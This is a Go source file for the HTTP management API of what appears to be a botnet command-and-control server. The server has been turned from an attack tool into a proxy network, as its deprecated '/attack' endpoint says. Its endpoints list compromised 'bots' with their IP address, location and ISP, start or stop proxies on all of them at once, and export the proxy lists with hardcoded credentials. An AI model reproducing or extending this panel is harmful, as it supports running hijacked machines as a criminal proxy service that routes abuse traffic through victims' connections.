package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

// NewAPI will create the new API server for proxy management
func NewAPI() {
	mux := mux.NewRouter()

	// Legacy attack endpoint (deprecated)
	mux.HandleFunc("/attack", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusGone)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "attack endpoint deprecated - this is now a proxy network",
		})
	})

	// Get list of available proxies
	mux.HandleFunc("/proxies", func(w http.ResponseWriter, r *http.Request) {
		if !authenticateAPIRequest(w, r) {
			return
		}

		proxies := proxyPool.GetOnlineProxies()
		
		type ProxyInfo struct {
			IP              string `json:"ip"`
			Port            uint16 `json:"port"`
			Country         string `json:"country"`
			City            string `json:"city"`
			ISP             string `json:"isp"`
			Status          string `json:"status"`
			Uptime          uint32 `json:"uptime"`
			ConnectionsActive uint32 `json:"connections_active"`
			BytesSent       uint64 `json:"bytes_sent"`
			BytesReceived   uint64 `json:"bytes_received"`
		}

		result := make([]ProxyInfo, 0)
		for _, proxy := range proxies {
			if proxy.Client == nil || proxy.Client.Conn == nil {
				continue
			}

			clientAddr := proxy.Client.Conn.RemoteAddr().(*net.TCPAddr)
			status := "idle"
			if proxy.Status == 0x01 {
				status = "running"
			} else if proxy.Status == 0x02 {
				status = "error"
			}

			result = append(result, ProxyInfo{
				IP:                clientAddr.IP.String(),
				Port:              proxy.Port,
				Country:           proxy.Country,
				City:              proxy.City,
				ISP:               proxy.ISP,
				Status:            status,
				Uptime:            proxy.Stats.Uptime,
				ConnectionsActive: proxy.Stats.ConnectionsActive,
				BytesSent:         proxy.Stats.BytesSent,
				BytesReceived:     proxy.Stats.BytesReceived,
			})
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"count":   len(result),
			"proxies": result,
		})
	})

	// Start proxy on all bots
	mux.HandleFunc("/proxy/start", func(w http.ResponseWriter, r *http.Request) {
		if !authenticateAPIRequest(w, r) {
			return
		}

		user, _ := FindUser(r.URL.Query().Get("user"))
		if user == nil || !user.Admin {
			w.WriteHeader(http.StatusForbidden)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "admin access required",
			})
			return
		}

		port := 1080
		if portStr := r.URL.Query().Get("port"); portStr != "" {
			if p, err := strconv.Atoi(portStr); err == nil {
				port = p
			}
		}

		config := DefaultProxyConfig
		config.Port = uint16(port)

		if authStr := r.URL.Query().Get("auth"); authStr == "true" || authStr == "1" {
			config.AuthRequired = 1
		}

		if maxConn := r.URL.Query().Get("max_connections"); maxConn != "" {
			if mc, err := strconv.Atoi(maxConn); err == nil && mc > 0 && mc <= 255 {
				config.MaxConnections = uint8(mc)
			}
		}

		success, failed := StartAllProxies(uint16(port), config)

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"started": success,
			"failed":  failed,
			"port":    port,
		})
	})

	// Stop all proxies
	mux.HandleFunc("/proxy/stop", func(w http.ResponseWriter, r *http.Request) {
		if !authenticateAPIRequest(w, r) {
			return
		}

		user, _ := FindUser(r.URL.Query().Get("user"))
		if user == nil || !user.Admin {
			w.WriteHeader(http.StatusForbidden)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "admin access required",
			})
			return
		}

		stopped := StopAllProxies()

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"stopped": stopped,
		})
	})

	// Get proxy statistics
	mux.HandleFunc("/proxy/stats", func(w http.ResponseWriter, r *http.Request) {
		if !authenticateAPIRequest(w, r) {
			return
		}

		totalProxies := proxyPool.Count()
		onlineProxies := proxyPool.OnlineCount()
		
		var totalConnections uint32
		var totalBytesSent uint64
		var totalBytesRecv uint64

		for _, proxy := range proxyPool.GetOnlineProxies() {
			totalConnections += proxy.Stats.ConnectionsActive
			totalBytesSent += proxy.Stats.BytesSent
			totalBytesRecv += proxy.Stats.BytesReceived
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":           true,
			"total_proxies":     totalProxies,
			"online_proxies":    onlineProxies,
			"total_connections": totalConnections,
			"total_bytes_sent":  totalBytesSent,
			"total_bytes_recv":  totalBytesRecv,
		})
	})

	// Get proxy list in specific format (for proxy clients)
	mux.HandleFunc("/proxy/list", func(w http.ResponseWriter, r *http.Request) {
		if !authenticateAPIRequest(w, r) {
			return
		}

		format := r.URL.Query().Get("format")
		if format == "" {
			format = "ip:port"
		}

		proxies := proxyPool.GetOnlineProxies()
		lines := make([]string, 0)

		for _, proxy := range proxies {
			if proxy.Client == nil || proxy.Client.Conn == nil {
				continue
			}

			clientAddr := proxy.Client.Conn.RemoteAddr().(*net.TCPAddr)
			ip := clientAddr.IP.String()

			switch format {
			case "ip:port":
				lines = append(lines, fmt.Sprintf("%s:%d", ip, proxy.Port))
			case "ip:port:user:pass":
				lines = append(lines, fmt.Sprintf("%s:%d:proxy:proxy123", ip, proxy.Port))
			case "json":
				// JSON handled separately below
			default:
				lines = append(lines, fmt.Sprintf("%s:%d", ip, proxy.Port))
			}
		}

		if format == "json" {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": true,
				"count":   len(proxies),
				"proxies": proxies,
			})
		} else {
			w.Header().Set("Content-Type", "text/plain")
			w.Write([]byte(strings.Join(lines, "\n")))
		}
	})

	// Health check endpoint
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":  "ok",
			"version": Version,
			"time":    time.Now().Unix(),
		})
	})

	// Start proxy health checker
	go ProxyHealthCheck()

	switch Options.Templates.API.TLS {
	case true: // TLS
		http.ListenAndServeTLS(Options.Templates.API.Listener, Options.Templates.API.Cert, Options.Templates.API.Key, mux)
	default:
		http.ListenAndServe(Options.Templates.API.Listener, mux)
	}
}

// authenticateAPIRequest validates user credentials for API access
func authenticateAPIRequest(w http.ResponseWriter, r *http.Request) bool {
	username := r.URL.Query().Get("user")
	password := r.URL.Query().Get("password")

	if username == "" || password == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "missing user or password",
		})
		return false
	}

	user, err := FindUser(username)
	if err != nil || user == nil {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "invalid username",
		})
		return false
	}

	if user.Password != password {
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "invalid password",
		})
		return false
	}

	if !user.API {
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "api access not enabled for this user",
		})
		return false
	}

	return true
}
